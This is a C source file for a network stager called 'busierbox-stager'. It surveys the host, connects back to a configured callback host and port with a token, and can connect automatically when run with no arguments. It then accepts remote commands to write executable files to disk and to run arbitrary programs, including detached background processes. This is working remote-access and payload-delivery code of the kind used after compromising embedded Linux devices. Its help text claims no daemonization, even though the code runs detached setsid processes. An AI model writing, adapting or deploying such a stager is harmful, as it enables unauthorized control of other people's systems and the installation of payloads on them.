#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "sha256.h"

#ifndef BB_STAGER_TARGET_NAME
#define BB_STAGER_TARGET_NAME "native"
#endif
#ifndef BB_STAGER_CALLBACK_ENABLE
#define BB_STAGER_CALLBACK_ENABLE "no"
#endif
#ifndef BB_STAGER_CALLBACK_HOST
#define BB_STAGER_CALLBACK_HOST ""
#endif
#ifndef BB_STAGER_CALLBACK_PORT
#define BB_STAGER_CALLBACK_PORT "4444"
#endif
#ifndef BB_STAGER_TOKEN
#define BB_STAGER_TOKEN ""
#endif
#ifndef BB_STAGER_CONNECT_TIMEOUT
#define BB_STAGER_CONNECT_TIMEOUT 10
#endif
#ifndef BB_STAGER_RETRY_COUNT
#define BB_STAGER_RETRY_COUNT 3
#endif
#ifndef BB_STAGER_RETRY_DELAY
#define BB_STAGER_RETRY_DELAY 2
#endif
#ifndef BB_STAGER_OUTPUT_PATH
#define BB_STAGER_OUTPUT_PATH "/tmp/busierbox-full"
#endif
#ifndef BB_STAGER_ZERO_ARG_MODE
#define BB_STAGER_ZERO_ARG_MODE "help"
#endif
#ifndef BB_STAGER_AUTO_EXEC
#define BB_STAGER_AUTO_EXEC "doctor"
#endif
#ifndef BB_STAGER_POST_RECEIVE_ACTION
#define BB_STAGER_POST_RECEIVE_ACTION BB_STAGER_AUTO_EXEC
#endif

#define PROTOCOL "busierbox-stager-v1"
#define STAGER_VERSION "dev"
#define MAX_FRAME (1024U * 1024U)
#define MAX_FILE (128ULL * 1024ULL * 1024ULL)
#define EXEC_CAPTURE_LIMIT 16384

struct opts {
    const char *host;
    const char *port;
    const char *token;
    const char *output_path;
    const char *auto_exec;
    int timeout;
    int retry_count;
    int retry_delay;
    int callback;
};

static void usage(FILE *out)
{
    fprintf(out,
        "usage: busierbox-stager [survey --json]\n"
        "       busierbox-stager [--callback-host HOST --callback-port PORT --token TOKEN]\n"
        "                         [--output PATH] [--auto-exec none|callback|shell|custom]\n"
        "                         [--timeout SEC] [--retry-count N|-1] [--retry-delay SEC]\n\n"
        "With zero-arg callback mode configured, running with no arguments connects back automatically.\n"
        "No persistence, daemonization, or background beaconing is performed.\n");
}

static int streq(const char *a, const char *b)
{
    return strcmp(a, b) == 0;
}

static void json_escape(FILE *out, const char *s)
{
    const unsigned char *p = (const unsigned char *)s;
    fputc('"', out);
    while (*p) {
        if (*p == '"' || *p == '\\') {
            fputc('\\', out);
            fputc(*p, out);
        } else if (*p == '\n') {
            fputs("\\n", out);
        } else if (*p == '\r') {
            fputs("\\r", out);
        } else if (*p == '\t') {
            fputs("\\t", out);
        } else if (*p < 32) {
            fprintf(out, "\\u%04x", *p);
        } else {
            fputc(*p, out);
        }
        p++;
    }
    fputc('"', out);
}

static const char *endianness(void)
{
    uint16_t x = 1;
    return (*(uint8_t *)&x) ? "little" : "big";
}

static int path_exec_ok(const char *path)
{
    char probe[512];
    int fd;
    snprintf(probe, sizeof(probe), "%s/.bbx-exec-test-%ld", path, (long)getpid());
    fd = open(probe, O_CREAT | O_WRONLY | O_TRUNC, 0700);
    if (fd < 0)
        return 0;
    if (write(fd, "#!/bin/sh\nexit 0\n", 17) != 17) {
        close(fd);
        unlink(probe);
        return 0;
    }
    close(fd);
    if (access(probe, X_OK) != 0) {
        unlink(probe);
        return 0;
    }
    unlink(probe);
    return 1;
}

static unsigned long long free_bytes(const char *path)
{
    struct statvfs sv;
    if (statvfs(path, &sv) != 0)
        return 0;
    return (unsigned long long)sv.f_bavail * (unsigned long long)sv.f_frsize;
}

static const char *likely_tuple(const struct utsname *u)
{
    if (strstr(u->machine, "mips") && strstr(endianness(), "little"))
        return "mipsel-linux-4.x-musl";
    if (strstr(u->machine, "mips"))
        return "mips-linux-4.x-musl";
    if (strstr(u->machine, "armv7") || strstr(u->machine, "armv6"))
        return "armv7-linux-3.x-musl";
    if (strstr(u->machine, "aarch64"))
        return "aarch64-linux-4.x-musl";
    if (strstr(u->machine, "x86_64"))
        return "x86_64-linux-current-musl";
    return "unknown";
}

static char *survey_json(void)
{
    FILE *fp;
    char *buf = NULL;
    size_t len = 0;
    struct utsname u;
    char cwd[512] = "";
    const char *path = getenv("PATH");
    const char *home = getenv("HOME");
    const char *term = getenv("TERM");
    const char *dirs[] = { ".", "/tmp", "/var/tmp", "/dev/shm", NULL };
    int i;

    if (uname(&u) != 0)
        memset(&u, 0, sizeof(u));
    if (!getcwd(cwd, sizeof(cwd)))
        cwd[0] = '\0';

    fp = open_memstream(&buf, &len);
    if (!fp)
        return NULL;
    fputs("{", fp);
    fputs("\"protocol\":\"" PROTOCOL "\",", fp);
    fputs("\"stager_version\":\"" STAGER_VERSION "\",", fp);
    fputs("\"build_target\":", fp); json_escape(fp, BB_STAGER_TARGET_NAME); fputs(",", fp);
    fputs("\"uname_sysname\":", fp); json_escape(fp, u.sysname); fputs(",", fp);
    fputs("\"uname_release\":", fp); json_escape(fp, u.release); fputs(",", fp);
    fputs("\"uname_machine\":", fp); json_escape(fp, u.machine); fputs(",", fp);
    fprintf(fp, "\"endianness\":\"%s\",", endianness());
    fprintf(fp, "\"pointer_width\":%d,", (int)(sizeof(void *) * 8));
    fprintf(fp, "\"uid\":%ld,\"euid\":%ld,", (long)getuid(), (long)geteuid());
    fputs("\"cwd\":", fp); json_escape(fp, cwd); fputs(",", fp);
    fputs("\"env_path\":", fp); json_escape(fp, path ? path : ""); fputs(",", fp);
    fputs("\"home\":", fp); json_escape(fp, home ? home : ""); fputs(",", fp);
    fputs("\"term\":", fp); json_escape(fp, term ? term : ""); fputs(",", fp);
    fprintf(fp, "\"proc_exists\":%s,", access("/proc", F_OK) == 0 ? "true" : "false");
    fprintf(fp, "\"devpts_exists\":%s,", access("/dev/pts", F_OK) == 0 ? "true" : "false");
    fputs("\"ptrace\":\"unknown\",", fp);
    fputs("\"dirs\":[", fp);
    for (i = 0; dirs[i]; i++) {
        struct stat st;
        int exists = stat(dirs[i], &st) == 0;
        if (i)
            fputs(",", fp);
        fputs("{\"path\":", fp); json_escape(fp, dirs[i]);
        fprintf(fp, ",\"exists\":%s,\"writable\":%s,\"executable\":%s,\"free_bytes\":%llu}",
            exists ? "true" : "false",
            access(dirs[i], W_OK) == 0 ? "true" : "false",
            exists && path_exec_ok(dirs[i]) ? "true" : "false",
            exists ? free_bytes(dirs[i]) : 0ULL);
    }
    fputs("],", fp);
    fputs("\"interfaces\":[],", fp);
    fputs("\"recommendations\":{", fp);
    fprintf(fp, "\"payload_mode_possible\":%s,", access("/tmp", W_OK) == 0 ? "true" : "false");
    fputs("\"recommended_extract_dir\":\"/tmp\",", fp);
    fputs("\"likely_tuple\":", fp); json_escape(fp, likely_tuple(&u));
    fputs("}", fp);
    fputs("}", fp);
    fclose(fp);
    return buf;
}

static int write_all(int fd, const void *buf, size_t len)
{
    const unsigned char *p = buf;
    while (len) {
        ssize_t n = write(fd, p, len);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        p += n;
        len -= (size_t)n;
    }
    return 0;
}

static int read_all(int fd, void *buf, size_t len)
{
    unsigned char *p = buf;
    while (len) {
        ssize_t n = read(fd, p, len);
        if (n == 0)
            return -1;
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        p += n;
        len -= (size_t)n;
    }
    return 0;
}

static int send_frame(int fd, const char *json)
{
    uint32_t n = (uint32_t)strlen(json);
    uint32_t be = htonl(n);
    if (n > MAX_FRAME)
        return -1;
    return write_all(fd, &be, 4) || write_all(fd, json, n) ? -1 : 0;
}

static char *recv_frame(int fd)
{
    uint32_t be, n;
    char *buf;
    if (read_all(fd, &be, 4) != 0)
        return NULL;
    n = ntohl(be);
    if (n == 0 || n > MAX_FRAME)
        return NULL;
    buf = calloc(1, (size_t)n + 1);
    if (!buf)
        return NULL;
    if (read_all(fd, buf, n) != 0) {
        free(buf);
        return NULL;
    }
    return buf;
}

static int json_get_string(const char *json, const char *key, char *out, size_t outsz)
{
    char pat[96];
    const char *p, *q;
    size_t n = 0;
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    p = strstr(json, pat);
    if (!p)
        return -1;
    p = strchr(p + strlen(pat), ':');
    if (!p)
        return -1;
    p++;
    while (*p == ' ' || *p == '\t')
        p++;
    if (*p != '"')
        return -1;
    p++;
    q = p;
    while (*q && *q != '"') {
        if (*q == '\\' && q[1])
            q++;
        if (n + 1 < outsz)
            out[n++] = *q;
        q++;
    }
    out[n] = '\0';
    return *q == '"' ? 0 : -1;
}

static unsigned long long json_get_ull(const char *json, const char *key, unsigned long long def)
{
    char pat[96];
    const char *p;
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    p = strstr(json, pat);
    if (!p)
        return def;
    p = strchr(p + strlen(pat), ':');
    if (!p)
        return def;
    return strtoull(p + 1, NULL, 10);
}

static int json_get_argv(const char *json, char **argv, int max)
{
    const char *p = strstr(json, "\"argv\"");
    int argc = 0;
    if (!p)
        return 0;
    p = strchr(p, '[');
    if (!p)
        return 0;
    p++;
    while (*p && *p != ']' && argc + 1 < max) {
        while (*p && *p != '"' && *p != ']')
            p++;
        if (*p != '"')
            break;
        p++;
        {
            const char *start = p;
            size_t n;
            while (*p && *p != '"') {
                if (*p == '\\' && p[1])
                    p++;
                p++;
            }
            n = (size_t)(p - start);
            argv[argc] = malloc(n + 1);
            if (!argv[argc])
                break;
            memcpy(argv[argc], start, n);
            argv[argc][n] = '\0';
            argc++;
        }
        if (*p == '"')
            p++;
    }
    argv[argc] = NULL;
    return argc;
}

static int connect_once(const char *host, const char *port, int timeout)
{
    struct addrinfo hints, *res = NULL, *rp;
    int fd = -1;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    if (getaddrinfo(host, port, &hints, &res) != 0)
        return -1;
    for (rp = res; rp; rp = rp->ai_next) {
        int flags, err = 0;
        socklen_t errlen = sizeof(err);
        fd_set wfds;
        struct timeval tv;
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0)
            continue;
        flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) {
            fcntl(fd, F_SETFL, flags);
            break;
        }
        if (errno != EINPROGRESS) {
            close(fd);
            fd = -1;
            continue;
        }
        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        tv.tv_sec = timeout;
        tv.tv_usec = 0;
        if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0 &&
            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &errlen) == 0 && err == 0) {
            fcntl(fd, F_SETFL, flags);
            break;
        }
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

static int file_sha256_hex(const char *path, char out[65])
{
    FILE *fp = fopen(path, "rb");
    unsigned char buf[8192], hash[32];
    bb_sha256_ctx ctx;
    size_t n;
    if (!fp)
        return -1;
    bb_sha256_init(&ctx);
    while ((n = fread(buf, 1, sizeof(buf), fp)) > 0)
        bb_sha256_update(&ctx, buf, n);
    if (ferror(fp)) {
        fclose(fp);
        return -1;
    }
    fclose(fp);
    bb_sha256_final(&ctx, hash);
    bb_sha256_hex(hash, out);
    return 0;
}

static int send_result(int fd, const char *action, int ok, const char *extra)
{
    char msg[2048];
    snprintf(msg, sizeof(msg), "{\"type\":\"result\",\"action\":\"%s\",\"ok\":%s%s%s}",
        action, ok ? "true" : "false", extra && *extra ? "," : "", extra ? extra : "");
    return send_frame(fd, msg);
}

static int handle_send_file(int fd, const char *cmd, const struct opts *opts)
{
    char path[512], sha[80], got[65], extra[1200];
    unsigned long long size, left;
    unsigned int mode;
    FILE *out;
    unsigned char buf[8192];
    if (json_get_string(cmd, "path", path, sizeof(path)) != 0)
        snprintf(path, sizeof(path), "%s", opts->output_path);
    if (opts->output_path && opts->output_path[0])
        snprintf(path, sizeof(path), "%s", opts->output_path);
    if (json_get_string(cmd, "sha256", sha, sizeof(sha)) != 0)
        sha[0] = '\0';
    size = json_get_ull(cmd, "size", 0);
    mode = (unsigned int)json_get_ull(cmd, "mode", 0755);
    if (size == 0 || size > MAX_FILE)
        return send_result(fd, "send_file", 0, "\"message\":\"invalid file size\"");
    out = fopen(path, "wb");
    if (!out) {
        snprintf(extra, sizeof(extra), "\"path\":\"%s\",\"message\":\"open failed: %s\"", path, strerror(errno));
        return send_result(fd, "send_file", 0, extra);
    }
    left = size;
    while (left) {
        size_t want = left > sizeof(buf) ? sizeof(buf) : (size_t)left;
        if (read_all(fd, buf, want) != 0 || fwrite(buf, 1, want, out) != want) {
            fclose(out);
            snprintf(extra, sizeof(extra), "\"path\":\"%s\",\"message\":\"receive/write failed\"", path);
            return send_result(fd, "send_file", 0, extra);
        }
        left -= want;
    }
    if (fclose(out) != 0) {
        snprintf(extra, sizeof(extra), "\"path\":\"%s\",\"message\":\"close failed\"", path);
        return send_result(fd, "send_file", 0, extra);
    }
    chmod(path, (mode_t)mode);
    if (file_sha256_hex(path, got) != 0 || (sha[0] && strcmp(got, sha) != 0)) {
        snprintf(extra, sizeof(extra), "\"path\":\"%s\",\"sha256_ok\":false,\"sha256\":\"%s\",\"message\":\"sha256 mismatch\"", path, got);
        return send_result(fd, "send_file", 0, extra);
    }
    snprintf(extra, sizeof(extra), "\"path\":\"%s\",\"sha256_ok\":true,\"sha256\":\"%s\",\"message\":\"wrote file\"", path, got);
    return send_result(fd, "send_file", 1, extra);
}

static int json_get_bool(const char *json, const char *key)
{
    char pat[96];
    const char *p;
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    p = strstr(json, pat);
    if (!p)
        return 0;
    p = strchr(p + strlen(pat), ':');
    if (!p)
        return 0;
    p++;
    while (*p == ' ' || *p == '\t')
        p++;
    return strncmp(p, "true", 4) == 0;
}

static int handle_exec(int fd, const char *cmd)
{
    char *argv[16];
    int argc, pfd[2], status = 127, ok = 0, nread = 0;
    char output[EXEC_CAPTURE_LIMIT + 1], *escaped = NULL;
    FILE *mem;
    size_t elen = 0;
    pid_t pid;
    int i;
    int background = json_get_bool(cmd, "background");

    argc = json_get_argv(cmd, argv, 16);
    if (argc == 0)
        return send_result(fd, "exec", 0, "\"message\":\"empty argv\"");

    if (background) {
        /* Double-fork: parent returns immediately; grandchild runs detached. */
        pid = fork();
        if (pid < 0)
            return send_result(fd, "exec", 0, "\"message\":\"fork failed\"");
        if (pid == 0) {
            pid_t gp = fork();
            if (gp != 0)
                _exit(0);
            setsid();
            execv(argv[0], argv);
            _exit(127);
        }
        waitpid(pid, &status, 0);
        {
            char extra[64];
            snprintf(extra, sizeof(extra), "\"background\":true,\"pid\":%ld", (long)pid);
            send_result(fd, "exec", 1, extra);
        }
        for (i = 0; i < argc; i++)
            free(argv[i]);
        return 0;
    }

    if (pipe(pfd) != 0)
        return send_result(fd, "exec", 0, "\"message\":\"pipe failed\"");
    pid = fork();
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[1]);
        execv(argv[0], argv);
        _exit(127);
    }
    close(pfd[1]);
    while (nread < EXEC_CAPTURE_LIMIT) {
        ssize_t n = read(pfd[0], output + nread, (size_t)(EXEC_CAPTURE_LIMIT - nread));
        if (n <= 0)
            break;
        nread += (int)n;
    }
    close(pfd[0]);
    output[nread] = '\0';
    if (pid > 0 && waitpid(pid, &status, 0) >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        ok = 1;
    mem = open_memstream(&escaped, &elen);
    if (mem) {
        fputs("\"stdout\":", mem);
        json_escape(mem, output);
        fprintf(mem, ",\"stderr\":\"\",\"exit_code\":%d", WIFEXITED(status) ? WEXITSTATUS(status) : 127);
        fclose(mem);
        send_result(fd, "exec", ok, escaped);
        free(escaped);
    } else {
        send_result(fd, "exec", ok, "\"message\":\"exec completed\"");
    }
    for (i = 0; i < argc; i++)
        free(argv[i]);
    return ok ? 0 : -1;
}

static int callback_session(const struct opts *opts)
{
    int attempt, fd = -1, rc = 1;
    char *survey, *hello, *cmd;
    FILE *mem;
    size_t hlen = 0;
    if (!opts->host || !opts->host[0] || !opts->port || !opts->port[0] || !opts->token || !opts->token[0]) {
        fprintf(stderr, "stager: callback requires host, port, and token\n");
        return 2;
    }
    for (attempt = 0; opts->retry_count < 0 || attempt < opts->retry_count; attempt++) {
        fd = connect_once(opts->host, opts->port, opts->timeout);
        if (fd >= 0)
            break;
        if (opts->retry_count < 0 || attempt + 1 < opts->retry_count)
            sleep((unsigned int)opts->retry_delay);
    }
    if (fd < 0) {
        fprintf(stderr, "stager: callback connect failed to %s:%s\n", opts->host, opts->port);
        return 1;
    }
    survey = survey_json();
    if (!survey) {
        close(fd);
        return 1;
    }
    mem = open_memstream(&hello, &hlen);
    if (!mem) {
        free(survey);
        close(fd);
        return 1;
    }
    fputs("{\"type\":\"hello\",\"protocol\":\"" PROTOCOL "\",\"token\":", mem);
    json_escape(mem, opts->token);
    fputs(",\"stager_version\":\"" STAGER_VERSION "\",\"target\":", mem);
    json_escape(mem, BB_STAGER_TARGET_NAME);
    fputs(",\"auto_exec\":", mem);
    json_escape(mem, opts->auto_exec);
    fputs(",\"output_path\":", mem);
    json_escape(mem, opts->output_path);
    fputs(",\"survey\":", mem);
    fputs(survey, mem);
    fputs("}", mem);
    fclose(mem);
    free(survey);
    if (send_frame(fd, hello) != 0) {
        free(hello);
        close(fd);
        return 1;
    }
    free(hello);
    while ((cmd = recv_frame(fd)) != NULL) {
        char type[64];
        if (json_get_string(cmd, "type", type, sizeof(type)) != 0) {
            free(cmd);
            break;
        }
        if (streq(type, "send_file")) {
            handle_send_file(fd, cmd, opts);
        } else if (streq(type, "exec")) {
            handle_exec(fd, cmd);
        } else if (streq(type, "close")) {
            rc = 0;
            free(cmd);
            break;
        } else {
            send_result(fd, type, 0, "\"message\":\"unknown command\"");
        }
        free(cmd);
    }
    close(fd);
    return rc;
}

int main(int argc, char **argv)
{
    struct opts opts;
    int i;
    memset(&opts, 0, sizeof(opts));
    opts.host = BB_STAGER_CALLBACK_HOST;
    opts.port = BB_STAGER_CALLBACK_PORT;
    opts.token = BB_STAGER_TOKEN;
    opts.output_path = BB_STAGER_OUTPUT_PATH;
    opts.auto_exec = BB_STAGER_POST_RECEIVE_ACTION;
    opts.timeout = BB_STAGER_CONNECT_TIMEOUT;
    opts.retry_count = BB_STAGER_RETRY_COUNT;
    opts.retry_delay = BB_STAGER_RETRY_DELAY;
    opts.callback = streq(BB_STAGER_CALLBACK_ENABLE, "yes");

    if (argc > 1 && (streq(argv[1], "--help") || streq(argv[1], "-h"))) {
        usage(stdout);
        return 0;
    }
    if (argc == 1) {
        if (streq(BB_STAGER_ZERO_ARG_MODE, "callback")) {
            if (!opts.callback) {
                fprintf(stderr, "stager: zero-arg callback requested but callback is disabled\n");
                return 2;
            }
            if (opts.retry_count < 1)
                opts.retry_count = 1;
            if (opts.timeout < 1)
                opts.timeout = 1;
            signal(SIGPIPE, SIG_IGN);
            return callback_session(&opts);
        }
        if (streq(BB_STAGER_ZERO_ARG_MODE, "help") || streq(BB_STAGER_ZERO_ARG_MODE, "menu")) {
            usage(stdout);
            return 0;
        }
        fprintf(stderr, "stager: zero-arg mode '%s' is not supported by the stager runtime yet\n", BB_STAGER_ZERO_ARG_MODE);
        usage(stderr);
        return 2;
    }
    if (argc > 2 && streq(argv[1], "survey") && streq(argv[2], "--json")) {
        char *s = survey_json();
        if (!s)
            return 1;
        puts(s);
        free(s);
        return 0;
    }
    for (i = 1; i < argc; i++) {
        if (streq(argv[i], "--callback-host") && i + 1 < argc) {
            opts.host = argv[++i]; opts.callback = 1;
        } else if (streq(argv[i], "--callback-port") && i + 1 < argc) {
            opts.port = argv[++i]; opts.callback = 1;
        } else if (streq(argv[i], "--token") && i + 1 < argc) {
            opts.token = argv[++i]; opts.callback = 1;
        } else if (streq(argv[i], "--output") && i + 1 < argc) {
            opts.output_path = argv[++i];
        } else if (streq(argv[i], "--auto-exec") && i + 1 < argc) {
            opts.auto_exec = argv[++i];
        } else if (streq(argv[i], "--timeout") && i + 1 < argc) {
            opts.timeout = atoi(argv[++i]);
        } else if (streq(argv[i], "--retry-count") && i + 1 < argc) {
            opts.retry_count = atoi(argv[++i]);
        } else if (streq(argv[i], "--retry-delay") && i + 1 < argc) {
            opts.retry_delay = atoi(argv[++i]);
        } else {
            fprintf(stderr, "stager: unknown argument: %s\n", argv[i]);
            usage(stderr);
            return 2;
        }
    }
    if (opts.retry_count == 0 || opts.retry_count < -1)
        opts.retry_count = 1;
    if (opts.timeout < 1)
        opts.timeout = 1;
    if (opts.retry_delay < 0)
        opts.retry_delay = 0;
    if (!opts.callback) {
        usage(stderr);
        return 2;
    }
    signal(SIGPIPE, SIG_IGN);
    return callback_session(&opts);
}
